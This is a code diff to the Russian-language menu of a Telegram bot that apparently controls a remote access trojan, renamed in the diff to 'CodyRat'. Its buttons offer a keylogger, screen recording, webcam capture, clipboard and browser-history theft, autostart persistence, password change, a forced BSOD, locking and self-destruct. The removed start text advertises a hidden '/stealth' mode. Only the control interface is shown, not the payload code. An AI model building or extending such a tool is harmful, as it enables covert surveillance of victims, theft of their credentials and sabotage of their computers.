@@ -11,22 +11,17 @@ menu = ReplyKeyboardMarkup(keyboard=[
     [KeyboardButton(text="🔴 Запись экрана"), KeyboardButton(text="📋 Буфер")],
     [KeyboardButton(text="🔔 Уведомление"), KeyboardButton(text="⏻ Питание")],
     [KeyboardButton(text="📷 Вебкамера"), KeyboardButton(text="🌐 Открыть URL")],
-    [KeyboardButton(text="🔑 Кейлоггер"), KeyboardButton(text="🖱 Мышь/Клава")],
+    [KeyboardButton(text="🔑 Кейлоггер"), KeyboardButton(text="🖱 Управление мышью")],
     [KeyboardButton(text="🔌 Wi-Fi сети"), KeyboardButton(text="⏰ Планировщик")],
-    [KeyboardButton(text="📊 График"), KeyboardButton(text="📡 Интернет")],
-    [KeyboardButton(text="🎵 Медиа"), KeyboardButton(text="📺 Дисплей")],
-    [KeyboardButton(text="🔐 Автозапуск"), KeyboardButton(text="📦 Программы")],
-    [KeyboardButton(text="💬 Чат с ПК"), KeyboardButton(text="🌐 История браузера")],
-    [KeyboardButton(text="🎨 Обои"), KeyboardButton(text="🔀 Бесить мышь")],
-    [KeyboardButton(text="🖱 Поменять кнопки мыши")],
+    [KeyboardButton(text="📡 Интернет"), KeyboardButton(text="🎵 Медиа")],
+    [KeyboardButton(text="📺 Дисплей"), KeyboardButton(text="🔐 Автозапуск")],
+    [KeyboardButton(text="📦 Программы"), KeyboardButton(text="🌐 История браузера")],
+    [KeyboardButton(text="🎨 Обои"), KeyboardButton(text="🖱 Поменять кнопки мыши")],
+    [KeyboardButton(text="💬 Чат с ПК"), KeyboardButton(text="🔑 Сменить пароль")],
+    [KeyboardButton(text="💥 BSOD"), KeyboardButton(text="🔒 Блокировка")],
+    [KeyboardButton(text="💣 Самоуничтожение")],
 ], resize_keyboard=True)
 
 @router.message(CommandStart())
 async def start(message: Message):
-    await message.answer(
-        "👋 <b>EazyHeck</b> запущен!\n\n"
-        "🕵️ Скрытый режим: /stealth\n"
-        "🖥 Показать окно: /showwindow\n\n"
-        "Выбери действие:",
-        reply_markup=menu
-    )
+    await message.answer("👋 <b>CodyRat</b>\n\nВыбери действие:", reply_markup=menu)
